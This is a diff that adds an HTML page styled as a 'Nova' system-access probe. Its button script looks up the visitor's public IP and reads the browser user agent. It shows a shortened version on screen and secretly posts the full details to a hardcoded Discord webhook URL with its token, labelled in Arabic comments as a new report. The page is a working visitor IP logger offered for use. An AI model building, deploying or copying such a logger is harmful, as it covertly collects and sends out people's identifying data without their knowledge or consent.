@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nova | System Access</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', Courier, monospace; }
+        
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #050505;
+            background-image: radial-gradient(circle at top, #1a0000, #050505);
+            color: #d1d1d1;
+        }
+
+        .card {
+            width: 400px;
+            padding: 40px;
+            background: rgba(10, 10, 10, 0.8);
+            border: 1px solid #8b0000;
+            border-radius: 0;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 20px rgba(139, 0, 0, 0.3);
+            text-align: center;
+        }
+
+        h1 { color: #8b0000; margin-bottom: 20px; letter-spacing: 3px; }
+
+        .info {
+            padding: 15px;
+            margin: 15px 0;
+            background: rgba(255, 255, 255, 0.03);
+            border-left: 3px solid #8b0000;
+            text-align: left;
+            word-break: break-all;
+            font-size: 14px;
+        }
+
+        button {
+            margin-top: 20px;
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            border: 1px solid #8b0000;
+            color: #8b0000;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: 0.4s;
+        }
+
+        button:hover {
+            background: #8b0000;
+            color: white;
+            box-shadow: 0 0 15px #8b0000;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h1>NOVA</h1>
+    <p>System Data Probe</p>
+
+    <div class="info" id="ip">IP: Awaiting Connection...</div>
+    <div class="info" id="browser">Browser: Awaiting Connection...</div>
+
+    <button onclick="loadData()">Initialize Access</button>
+</div>
+
+<script>
+    async function loadData() {
+        const ipDiv = document.getElementById("ip");
+        const browserDiv = document.getElementById("browser");
+        
+        ipDiv.innerHTML = "IP: Probing...";
+        
+        try {
+            // جلب البيانات
+            const data = await fetch("https://api.ipify.org?format=json").then(r => r.json());
+            const userAgent = navigator.userAgent;
+
+            ipDiv.innerHTML = "IP: " + data.ip;
+            browserDiv.innerHTML = "Browser: " + userAgent.split(' ').slice(0, 3).join(' ');
+
+            // --- مكان الـ Webhook ---
+            const webhookUrl = "https://discord.com/api/webhooks/1519163425148637336/gwmx1gVTyfQnpSaWUS6EWPM0WqrOo8VHv3Vd7nGyV2lZp6vH4Vnv0VIQFLEoYjE54pek"; 
+            
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: `🚨 **تقرير جديد من Nova!**\nIP: ${data.ip}\nBrowser: ${userAgent}`
+                })
+            });
+            // -----------------------
+
+        } catch (e) {
+            ipDiv.innerHTML = "Error: Connection Failed";
+        }
+    }
+</script>
+
+</body>
+</html>
